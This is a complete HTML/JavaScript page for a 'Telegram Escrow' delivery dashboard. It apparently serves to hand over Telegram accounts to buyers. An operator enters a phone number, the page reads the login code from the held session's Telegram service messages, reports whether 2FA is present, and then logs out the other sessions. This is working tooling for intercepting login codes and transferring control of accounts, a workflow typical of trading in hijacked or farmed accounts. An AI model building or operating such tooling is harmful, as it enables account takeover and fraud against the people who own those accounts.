<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Delivery - Telegram Escrow</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
        a{color:#38bdf8;text-decoration:none}a:hover{text-decoration:underline}
        .nav{background:#1e293b;border-bottom:1px solid #334155;padding:0 24px;display:flex;align-items:center;height:56px;gap:32px}
        .nav-brand{font-weight:700;font-size:1.1rem;color:#38bdf8;display:flex;align-items:center;gap:8px}
        .nav-links{display:flex;gap:4px}
        .nav-links a{padding:8px 16px;border-radius:6px;color:#94a3b8;font-size:.875rem;font-weight:500;transition:.15s}
        .nav-links a:hover,.nav-links a.active{background:#334155;color:#f1f5f9;text-decoration:none}
        .container{max-width:800px;margin:0 auto;padding:32px 16px}
        .card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:24px;margin-bottom:16px}
        .btn{padding:8px 18px;border-radius:8px;border:none;cursor:pointer;font-size:.85rem;font-weight:600;transition:.15s;display:inline-flex;align-items:center;gap:6px}
        .btn:disabled{opacity:.5;cursor:not-allowed}
        .btn-primary{background:#2563eb;color:#fff}.btn-primary:hover{background:#1d4ed8}
        .btn-success{background:#16a34a;color:#fff}.btn-success:hover{background:#15803d}
        .btn-danger{background:#dc2626;color:#fff}.btn-danger:hover{background:#b91c1c}
        .btn-ghost{background:transparent;border:1px solid #475569;color:#94a3b8}.btn-ghost:hover{background:#334155;color:#e2e8f0}
        .btn-lg{padding:12px 28px;font-size:1rem}
        input[type="text"],input[type="tel"]{width:100%;background:#0f172a;border:1px solid #334155;color:#e2e8f0;padding:10px 14px;border-radius:8px;font-size:.9rem;outline:none;transition:.15s}
        input:focus{border-color:#2563eb}
        .spinner{width:18px;height:18px;border:2px solid #334155;border-top-color:#38bdf8;border-radius:50%;animation:spin .6s linear infinite;display:inline-block}
        @keyframes spin{to{transform:rotate(360deg)}}
        /* Steps */
        .steps{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:24px}
        .step-card{background:#1e293b;border:2px solid #334155;border-radius:10px;padding:14px;text-align:center;transition:.2s}
        .step-card .num{width:32px;height:32px;border-radius:50%;background:#334155;display:inline-flex;align-items:center;justify-content:center;font-weight:700;font-size:.85rem;margin-bottom:6px}
        .step-card .lbl{font-size:.75rem;color:#64748b}
        .step-card.active{border-color:#2563eb}.step-card.active .num{background:#2563eb}
        .step-card.done{border-color:#16a34a}.step-card.done .num{background:#16a34a}
        /* Content area */
        .flow-content{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:32px;text-align:center}
        .flow-content h3{font-size:1.15rem;margin-bottom:8px}
        .flow-content p{color:#94a3b8;font-size:.9rem;margin-bottom:20px}
        /* Code display */
        .code-box{display:inline-block;background:#0f172a;border:2px solid #2563eb;border-radius:12px;padding:16px 32px;font-family:'Cascadia Code','Fira Code',monospace;font-size:2.2rem;font-weight:700;color:#60a5fa;letter-spacing:.15em;margin:12px 0}
        .info-box{background:#172554;border:1px solid #1e40af;border-radius:8px;padding:12px 16px;font-size:.85rem;color:#93c5fd;margin:12px 0;text-align:left}
        .warn-box{background:#422006;border:1px solid #854d0e;border-radius:8px;padding:12px 16px;font-size:.85rem;color:#fbbf24;margin:12px 0}
        .success-box{background:#052e16;border:1px solid #166534;border-radius:12px;padding:32px;text-align:center;margin:12px 0}
        .success-box h3{color:#4ade80;font-size:1.3rem;margin-bottom:8px}
        /* Timer */
        .timer{font-family:'Cascadia Code',monospace;font-size:1.6rem;font-weight:700;color:#f87171}
        /* Toast */
        .toast{position:fixed;top:16px;right:16px;z-index:200;padding:12px 20px;border-radius:8px;font-size:.85rem;font-weight:500;display:none;max-width:400px;box-shadow:0 8px 24px rgba(0,0,0,.3)}
        .toast.show{display:block;animation:slideIn .3s ease}
        .toast-ok{background:#052e16;border:1px solid #166534;color:#4ade80}
        .toast-err{background:#450a0a;border:1px solid #991b1b;color:#f87171}
        .toast-info{background:#172554;border:1px solid #1e40af;color:#60a5fa}
        @keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
        .mono{font-family:'Cascadia Code','Fira Code',monospace}
        @media(max-width:600px){.steps{grid-template-columns:repeat(2,1fr)}.nav-links{display:none}}
    </style>
</head>
<body>
    <nav class="nav">
        <div class="nav-brand">&#9889; Telegram Escrow</div>
        <div class="nav-links">
            <a href="/">Register</a>
            <a href="/receive">Admin Panel</a>
            <a href="/dashboard" class="active">Delivery</a>
        </div>
    </nav>

    <div id="toast" class="toast"></div>

    <div class="container">
        <h2 style="font-size:1.4rem;margin-bottom:20px;font-weight:700">Session Delivery</h2>

        <!-- Phone Input -->
        <div id="phone-section" class="card">
            <label style="font-size:.82rem;color:#94a3b8;display:block;margin-bottom:6px">Phone Number</label>
            <div style="display:flex;gap:8px">
                <input type="tel" id="phone-input" placeholder="+1234567890">
                <button class="btn btn-primary" id="btn-check" onclick="checkSession()">Check</button>
            </div>
        </div>

        <!-- Steps -->
        <div id="steps-area" class="steps" style="display:none">
            <div class="step-card" id="st-1"><div class="num">1</div><div class="lbl">Check</div></div>
            <div class="step-card" id="st-2"><div class="num">2</div><div class="lbl">Request Code</div></div>
            <div class="step-card" id="st-3"><div class="num">3</div><div class="lbl">Get Code</div></div>
            <div class="step-card" id="st-4"><div class="num">4</div><div class="lbl">Confirm</div></div>
        </div>

        <!-- Dynamic Flow Content -->
        <div id="flow" style="display:none"></div>
    </div>

<script>
const API = location.origin + '/api/v1';
let phone = '';

async function api(path, method='GET', body=null) {
    const o = {method, headers:{'Content-Type':'application/json'}};
    if (body) o.body = JSON.stringify(body);
    const r = await fetch(API+path, o);
    const j = await r.json();
    if (!r.ok) throw new Error(j.detail||'Error');
    return j;
}

let toastT;
function toast(msg,type='info'){const t=document.getElementById('toast');t.className=`toast show toast-${type}`;t.textContent=msg;clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove('show'),3500)}

function setStep(n, status='active') {
    for (let i=1;i<=4;i++){
        const el=document.getElementById('st-'+i);
        el.classList.remove('active','done');
        if(i<n) el.classList.add('done');
        else if(i===n && status==='done') el.classList.add('done');
        else if(i===n) el.classList.add('active');
    }
}

function setBtnLoading(id, loading) {
    const b = document.getElementById(id);
    if (!b) return;
    b.disabled = loading;
    if (loading) b.innerHTML = '<span class="spinner"></span> Loading...';
}

async function checkSession() {
    phone = document.getElementById('phone-input').value.trim();
    if (!phone) return toast('Enter a phone number','err');
    setBtnLoading('btn-check', true);
    try {
        const r = await api(`/admin/account/${encodeURIComponent(phone)}`);
        if (r.status === 'success' && r.account) {
            document.getElementById('steps-area').style.display = '';
            document.getElementById('flow').style.display = '';
            setStep(1, 'done');
            showRequestCode();
            toast('Session found','ok');
        } else {
            toast('Session not found','err');
        }
    } catch(e) {
        toast(e.message,'err');
    } finally {
        setBtnLoading('btn-check', false);
        document.getElementById('btn-check').innerHTML = 'Check';
    }
}

function showRequestCode() {
    setStep(2);
    document.getElementById('flow').innerHTML = `
        <div class="flow-content">
            <h3>Request Login Code</h3>
            <p>Ask the buyer to request a login code from the official Telegram app, then click below.</p>
            <button class="btn btn-primary btn-lg" id="btn-req" onclick="requestCode()">I've Requested the Code</button>
        </div>`;
}

async function requestCode() {
    setBtnLoading('btn-req', true);
    try {
        await api(`/delivery/request-code/${encodeURIComponent(phone)}`,'POST');
        setStep(2,'done');
        showGetCode();
        toast('Code requested','ok');
    } catch(e) { toast(e.message,'err'); }
    finally { setBtnLoading('btn-req',false); document.getElementById('btn-req') && (document.getElementById('btn-req').textContent="I've Requested the Code"); }
}

function showGetCode() {
    setStep(3);
    document.getElementById('flow').innerHTML = `
        <div class="flow-content">
            <h3>Retrieve Login Code</h3>
            <p>The system will read the code from Telegram messages (777000).</p>
            <button class="btn btn-success btn-lg" id="btn-get" onclick="getCode()">Retrieve Code</button>
            <div id="code-result" style="margin-top:16px"></div>
        </div>`;
}

async function getCode() {
    setBtnLoading('btn-get', true);
    try {
        const r = await api(`/email/code-fallback/${encodeURIComponent(phone)}`);
        if (r.status === 'success' && r.code) {
            setStep(3,'done');
            showConfirm(r);
        } else if (r.status === 'waiting') {
            document.getElementById('code-result').innerHTML = `<div class="info-box">Waiting for code... Try again in a few seconds.</div>`;
        } else {
            toast(r.message||'No code yet','info');
        }
    } catch(e) { toast(e.message,'err'); }
    finally { setBtnLoading('btn-get',false); const b=document.getElementById('btn-get'); if(b) b.textContent='Retrieve Code'; }
}

function showConfirm(data) {
    setStep(4);
    const deadline = data.confirmation_deadline ? new Date(data.confirmation_deadline) : null;
    const timeoutMin = data.timeout_minutes || 30;
    
    let html = `<div class="flow-content">
        <h3>Delivery Ready</h3>
        <div class="code-box">${data.code}</div>
        <div class="info-box">
            <strong>2FA:</strong> ${data.has_password ? 'Exists (protected)' : 'No 2FA'}
        </div>`;
    
    if (deadline) {
        html += `<div class="warn-box" style="display:flex;justify-content:space-between;align-items:center">
            <span>Confirmation deadline:</span>
            <span class="timer" id="countdown">${timeoutMin}:00</span>
        </div>`;
    }
    
    html += `<div style="margin-top:20px">
            <button class="btn btn-success btn-lg" id="btn-confirm" onclick="confirmDelivery()">Buyer Logged In Successfully</button>
        </div>
    </div>`;
    
    document.getElementById('flow').innerHTML = html;
    if (deadline) startCountdown(deadline);
}

function startCountdown(deadline) {
    const el = document.getElementById('countdown');
    if (!el) return;
    const iv = setInterval(() => {
        const d = deadline - new Date();
        if (d <= 0) { clearInterval(iv); el.textContent = 'EXPIRED'; return; }
        const m = Math.floor(d/60000), s = Math.floor((d%60000)/1000);
        el.textContent = `${m}:${String(s).padStart(2,'0')}`;
    }, 1000);
}

async function confirmDelivery() {
    if (!confirm('Confirm delivery? Sessions will be logged out.')) return;
    setBtnLoading('btn-confirm', true);
    try {
        const r = await api(`/delivery/confirm/${encodeURIComponent(phone)}`,'POST',{received:true});
        setStep(4,'done');
        document.getElementById('flow').innerHTML = `
            <div class="success-box">
                <div style="font-size:3rem;margin-bottom:12px">&#10004;</div>
                <h3>Delivery Complete!</h3>
                <p style="color:#86efac;margin-top:8px">${r.message||'Account delivered successfully'}</p>
                ${r.logout_results ? `<p style="color:#64748b;font-size:.8rem;margin-top:8px">${r.logout_results.join(' | ')}</p>` : ''}
                <button class="btn btn-ghost" style="margin-top:20px" onclick="location.reload()">New Delivery</button>
            </div>`;
        toast('Delivery confirmed','ok');
    } catch(e) { toast(e.message,'err'); }
}

// URL param support
const params = new URLSearchParams(location.search);
if (params.get('phone')) {
    document.addEventListener('DOMContentLoaded', () => {
        document.getElementById('phone-input').value = params.get('phone');
        checkSession();
    });
}
</script>
</body>
</html>
